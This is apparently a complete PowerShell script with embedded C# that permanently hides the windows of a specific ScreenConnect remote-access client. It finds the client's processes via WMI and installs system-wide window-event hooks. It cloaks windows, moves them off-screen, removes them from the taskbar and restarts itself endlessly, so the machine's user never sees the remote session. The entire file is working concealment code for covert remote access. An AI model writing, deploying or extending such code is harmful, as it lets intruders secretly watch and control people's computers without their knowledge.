# ScreenConnect UI Hider - permanent background watcher (connected or not)
$ScInstallDir = 'C:\Program Files (x86)\ScreenConnect Client (fd944d6092d0e488)'

$mutex = New-Object System.Threading.Mutex($false, 'Local\ScHidePowerShell')
if (-not $mutex.WaitOne(0, $false)) { exit 0 }

if (-not ([System.Management.Automation.PSTypeName]'ScHiderEngine').Type) {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Management -TypeDefinition @"
using System;
using System.Collections.Generic;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public static class ScHiderEngine {
    static readonly string InstallDir = @"$($ScInstallDir.Replace('\', '\\'))";
    static readonly HashSet<int> TargetPids = new HashSet<int>();
    static readonly HashSet<int> HookedPids = new HashSet<int>();
    static readonly Dictionary<int, bool> PidCache = new Dictionary<int, bool>();

    static WinEventDelegate WinEventProc;
    static EnumWindowsProc EnumProc;
    static GCHandle GcWinEvent, GcEnum;
    static volatile bool Running = true;
    static bool GlobalHooksInstalled = false;

    delegate void WinEventDelegate(IntPtr hook, uint evt, IntPtr hwnd, int idObj, int idChild, uint thread, uint time);
    delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [DllImport("user32.dll")] static extern IntPtr SetWinEventHook(uint min, uint max, IntPtr mod, WinEventDelegate proc, uint pid, uint tid, uint flags);
    [DllImport("user32.dll")] static extern bool EnumWindows(EnumWindowsProc proc, IntPtr lParam);
    [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hwnd, out uint pid);
    [DllImport("user32.dll")] static extern bool IsWindow(IntPtr hwnd);
    [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr hwnd);
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hwnd, int cmd);
    [DllImport("user32.dll")] static extern int GetWindowLong(IntPtr hwnd, int idx);
    [DllImport("user32.dll")] static extern int SetWindowLong(IntPtr hwnd, int idx, int val);
    [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr hwnd, IntPtr ins, int x, int y, int cx, int cy, uint flags);
    [DllImport("user32.dll")] static extern bool GetMessage(out MSG msg, IntPtr hwnd, uint fmin, uint fmax);
    [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG msg);
    [DllImport("dwmapi.dll")] static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int val, int size);

    [StructLayout(LayoutKind.Sequential)] struct MSG {
        public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam;
        public uint time; public int pt_x; public int pt_y;
    }

    const uint EVENT_OBJECT_CREATE = 0x8000;
    const uint EVENT_OBJECT_SHOW = 0x8002;
    const uint EVENT_OBJECT_UNHIDE = 0x80018;
    const uint EVENT_SYSTEM_FOREGROUND = 0x0003;
    const uint EVENT_SYSTEM_MINIMIZEEND = 0x0017;
    const int GWL_EXSTYLE = -20;
    const int SW_HIDE = 0;
    const int DWMWA_CLOAK = 13;
    const uint SWP_NOSIZE = 0x0001;
    const uint SWP_NOACTIVATE = 0x0010;
    const uint SWP_HIDEWINDOW = 0x0080;
    static readonly IntPtr HWND_BOTTOM = new IntPtr(1);

    static void OnProcessChange() {
        RefreshPids();
        InstallHooks();
        EnumWindows(EnumProc, IntPtr.Zero);
    }

    static bool IsInstallPid(int pid) {
        if (pid <= 0) return false;
        lock (TargetPids) { if (TargetPids.Contains(pid)) return true; }
        bool cached;
        lock (PidCache) { if (PidCache.TryGetValue(pid, out cached)) return cached; }
        bool ok = false;
        try {
            using (ManagementObject o = new ManagementObject("Win32_Process.Handle='" + pid + "'")) {
                o.Get();
                object p = o["ExecutablePath"];
                string path = p != null ? p.ToString() : "";
                ok = path.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase);
            }
        } catch { }
        lock (PidCache) { PidCache[pid] = ok; }
        if (ok) lock (TargetPids) { TargetPids.Add(pid); }
        return ok;
    }

    static bool IsTargetHwnd(IntPtr hwnd) {
        if (hwnd == IntPtr.Zero || !IsWindow(hwnd)) return false;
        uint pid;
        GetWindowThreadProcessId(hwnd, out pid);
        return IsInstallPid((int)pid);
    }

    static void CloakAndHide(IntPtr hwnd) {
        if (hwnd == IntPtr.Zero || !IsWindow(hwnd)) return;
        int cloak = 1;
        try { DwmSetWindowAttribute(hwnd, DWMWA_CLOAK, ref cloak, 4); } catch { }
        ShowWindow(hwnd, SW_HIDE);
        SetWindowPos(hwnd, HWND_BOTTOM, -32000, -32000, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE | SWP_HIDEWINDOW);
        try {
            int s = GetWindowLong(hwnd, GWL_EXSTYLE);
            SetWindowLong(hwnd, GWL_EXSTYLE, (s | 0x80) & ~0x40000);
        } catch { }
        ShowWindow(hwnd, SW_HIDE);
    }

    static void HideTargetWindow(IntPtr hwnd) {
        if (!IsTargetHwnd(hwnd)) return;
        CloakAndHide(hwnd);
    }

    static void OnWinEvent(IntPtr hook, uint evt, IntPtr hwnd, int idObj, int idChild, uint thread, uint time) {
        HideTargetWindow(hwnd);
    }

    static bool EnumCallback(IntPtr hwnd, IntPtr lParam) {
        if (!IsTargetHwnd(hwnd)) return true;
        CloakAndHide(hwnd);
        if (IsWindowVisible(hwnd)) CloakAndHide(hwnd);
        return true;
    }

    static void RefreshPids() {
        HashSet<int> found = new HashSet<int>();
        try {
            List<ProcRow> all = new List<ProcRow>();
            using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT ProcessId,ParentProcessId,ExecutablePath FROM Win32_Process")) {
                foreach (ManagementObject o in s.Get()) {
                    ProcRow row = new ProcRow();
                    row.Pid = Convert.ToInt32(o["ProcessId"]);
                    row.Parent = Convert.ToInt32(o["ParentProcessId"]);
                    object p = o["ExecutablePath"];
                    row.Path = p != null ? p.ToString() : "";
                    all.Add(row);
                }
            }
            HashSet<int> set = new HashSet<int>();
            foreach (ProcRow row in all) {
                if (!string.IsNullOrEmpty(row.Path) && row.Path.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase))
                    set.Add(row.Pid);
            }
            bool changed = true;
            while (changed) {
                changed = false;
                foreach (ProcRow row in all) {
                    if (set.Contains(row.Parent) && !set.Contains(row.Pid)) { set.Add(row.Pid); changed = true; }
                }
            }
            foreach (int id in set) found.Add(id);
        } catch { }

        lock (TargetPids) {
            TargetPids.Clear();
            foreach (int id in found) TargetPids.Add(id);
        }
        lock (PidCache) {
            List<int> stale = new List<int>();
            foreach (int key in PidCache.Keys) {
                if (!found.Contains(key)) stale.Add(key);
            }
            foreach (int key in stale) PidCache.Remove(key);
            foreach (int id in found) PidCache[id] = true;
        }
        List<int> deadHooks = new List<int>();
        lock (HookedPids) {
            foreach (int pid in HookedPids) {
                if (!found.Contains(pid)) deadHooks.Add(pid);
            }
            foreach (int pid in deadHooks) HookedPids.Remove(pid);
        }
    }

    static void InstallHooks() {
        if (!GlobalHooksInstalled) {
            SetWinEventHook(EVENT_OBJECT_CREATE, EVENT_OBJECT_SHOW, IntPtr.Zero, WinEventProc, 0, 0, 0);
            SetWinEventHook(EVENT_OBJECT_UNHIDE, EVENT_OBJECT_UNHIDE, IntPtr.Zero, WinEventProc, 0, 0, 0);
            SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, WinEventProc, 0, 0, 0);
            SetWinEventHook(EVENT_SYSTEM_MINIMIZEEND, EVENT_SYSTEM_MINIMIZEEND, IntPtr.Zero, WinEventProc, 0, 0, 0);
            GlobalHooksInstalled = true;
        }
        lock (TargetPids) {
            lock (HookedPids) {
                foreach (int pid in TargetPids) {
                    if (!HookedPids.Contains(pid)) {
                        SetWinEventHook(EVENT_OBJECT_CREATE, EVENT_OBJECT_SHOW, IntPtr.Zero, WinEventProc, (uint)pid, 0, 0);
                        SetWinEventHook(EVENT_OBJECT_UNHIDE, EVENT_OBJECT_UNHIDE, IntPtr.Zero, WinEventProc, (uint)pid, 0, 0);
                        HookedPids.Add(pid);
                    }
                }
            }
        }
    }

    static void StartProcessWatcher() {
        Thread t = new Thread(() => {
            ManagementEventWatcher createWatcher = null;
            ManagementEventWatcher deleteWatcher = null;
            try {
                WqlEventQuery createQuery = new WqlEventQuery(
                    "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'");
                createWatcher = new ManagementEventWatcher(createQuery);
                createWatcher.EventArrived += (s, e) => {
                    try {
                        ManagementBaseObject target = (ManagementBaseObject)e.NewEvent["TargetInstance"];
                        string path = target["ExecutablePath"] != null ? target["ExecutablePath"].ToString() : "";
                        if (!string.IsNullOrEmpty(path) && path.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase)) {
                            OnProcessChange();
                        }
                    } catch { }
                };
                createWatcher.Start();

                WqlEventQuery deleteQuery = new WqlEventQuery(
                    "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'");
                deleteWatcher = new ManagementEventWatcher(deleteQuery);
                deleteWatcher.EventArrived += (s, e) => {
                    try { OnProcessChange(); } catch { }
                };
                deleteWatcher.Start();
            } catch { }

            while (Running) {
                Thread.Sleep(500);
            }

            try { if (createWatcher != null) createWatcher.Stop(); } catch { }
            try { if (deleteWatcher != null) deleteWatcher.Stop(); } catch { }
        });
        t.IsBackground = true;
        t.Priority = ThreadPriority.AboveNormal;
        t.Start();
    }

    static void HideLoop() {
        Thread.CurrentThread.Priority = ThreadPriority.Highest;
        int tick = 0;
        while (Running) {
            EnumWindows(EnumProc, IntPtr.Zero);
            if ((++tick & 7) == 0) {
                RefreshPids();
                InstallHooks();
            }
            Thread.Sleep(0);
        }
    }

    static void PumpLoop() {
        Thread.CurrentThread.Priority = ThreadPriority.Highest;
        MSG msg;
        while (Running && GetMessage(out msg, IntPtr.Zero, 0, 0)) {
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }
    }

    public static void Run() {
        WinEventProc = OnWinEvent;
        EnumProc = EnumCallback;
        GcWinEvent = GCHandle.Alloc(WinEventProc);
        GcEnum = GCHandle.Alloc(EnumProc);
        RefreshPids();
        InstallHooks();
        EnumWindows(EnumProc, IntPtr.Zero);
        StartProcessWatcher();
        Thread hideThread = new Thread(HideLoop);
        hideThread.IsBackground = true;
        hideThread.Priority = ThreadPriority.Highest;
        hideThread.Start();
        Thread pumpThread = new Thread(PumpLoop);
        pumpThread.IsBackground = true;
        pumpThread.Priority = ThreadPriority.Highest;
        pumpThread.Start();
        Application.Run();
    }
}

public class ProcRow {
    public int Pid;
    public int Parent;
    public string Path;
}
"@ -ErrorAction Stop
}

while ($true) {
    try {
        [ScHiderEngine]::Run()
    }
    catch {
        Start-Sleep -Seconds 2
    }
}
